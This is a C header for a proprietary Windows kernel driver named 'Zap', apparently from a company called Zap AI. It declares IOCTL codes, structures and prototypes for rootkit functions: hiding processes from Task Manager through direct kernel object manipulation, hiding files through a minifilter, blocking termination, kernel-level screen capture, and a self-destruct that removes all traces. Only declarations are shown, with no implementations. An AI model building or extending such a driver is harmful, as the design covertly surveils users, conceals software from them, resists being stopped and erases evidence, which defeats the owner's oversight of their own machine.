/*
 * zap_driver.h — Zap Kernel Driver Header
 *
 * Ring-0 kernel driver for Windows that provides:
 * 1. Process hiding from user-mode enumeration (Task Manager, Process Explorer, etc.)
 * 2. Kernel-level screen capture via DXGI/DWM interception
 * 3. Anti-termination protection
 * 4. Driver self-protection
 *
 * Communicates with user-mode via IOCTL interface.
 *
 * Copyright (c) 2026 Zap AI. All rights reserved. PROPRIETARY AND CONFIDENTIAL.
 */

#pragma once

#include <ntddk.h>
#include <wdm.h>

// ── Device name and symbolic link ──
#define ZAP_DEVICE_NAME     L"\\Device\\ZapShield"
#define ZAP_SYMLINK_NAME    L"\\DosDevices\\ZapShield"

// ── IOCTL codes ──
// CTL_CODE(DeviceType, Function, Method, Access)
#define IOCTL_ZAP_HIDE_PROCESS      CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ZAP_UNHIDE_PROCESS    CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ZAP_PROTECT_PROCESS   CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ZAP_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ZAP_CAPTURE_SCREEN    CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ZAP_GET_STATUS        CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ZAP_HIDE_FILE         CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ZAP_SELF_DESTRUCT     CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ── Shared structures (kernel ↔ usermode) ──

typedef struct _ZAP_PROCESS_REQUEST {
    ULONG ProcessId;
} ZAP_PROCESS_REQUEST, *PZAP_PROCESS_REQUEST;

typedef struct _ZAP_STATUS {
    BOOLEAN DriverLoaded;
    BOOLEAN ProcessHidden;
    BOOLEAN ProcessProtected;
    ULONG   HiddenPid;
    ULONG   ProtectedPid;
    ULONG   DriverVersion;
} ZAP_STATUS, *PZAP_STATUS;

typedef struct _ZAP_CAPTURE_REQUEST {
    ULONG Width;
    ULONG Height;
    ULONG BufferSize;
} ZAP_CAPTURE_REQUEST, *PZAP_CAPTURE_REQUEST;

typedef struct _ZAP_FILE_HIDE_REQUEST {
    WCHAR FilePath[260];
} ZAP_FILE_HIDE_REQUEST, *PZAP_FILE_HIDE_REQUEST;

// ── Driver version ──
#define ZAP_DRIVER_VERSION  1

// ── Internal driver state ──
typedef struct _ZAP_DRIVER_STATE {
    PDEVICE_OBJECT  DeviceObject;
    BOOLEAN         ProcessHidden;
    BOOLEAN         ProcessProtected;
    ULONG           HiddenPid;
    ULONG           ProtectedPid;
    PVOID           ObCallbackHandle;
    PVOID           PsCallbackHandle;
    FAST_MUTEX      StateLock;
} ZAP_DRIVER_STATE, *PZAP_DRIVER_STATE;

// ── Function prototypes ──
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD     ZapDriverUnload;

_Dispatch_type_(IRP_MJ_CREATE) DRIVER_DISPATCH ZapDispatchCreate;
_Dispatch_type_(IRP_MJ_CLOSE)  DRIVER_DISPATCH ZapDispatchClose;
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL) DRIVER_DISPATCH ZapDispatchIoctl;

// Process hiding via DKOM (Direct Kernel Object Manipulation)
NTSTATUS ZapHideProcess(ULONG ProcessId);
NTSTATUS ZapUnhideProcess(ULONG ProcessId);

// Process protection via ObRegisterCallbacks
NTSTATUS ZapProtectProcess(ULONG ProcessId);
NTSTATUS ZapUnprotectProcess(ULONG ProcessId);

// Kernel-level screen capture
NTSTATUS ZapCaptureScreen(PZAP_CAPTURE_REQUEST Request, PVOID OutputBuffer, ULONG OutputBufferLength);

// File hiding via minifilter
NTSTATUS ZapHideFile(PCWSTR FilePath);

// Self-destruct — remove all traces
NTSTATUS ZapSelfDestruct(void);
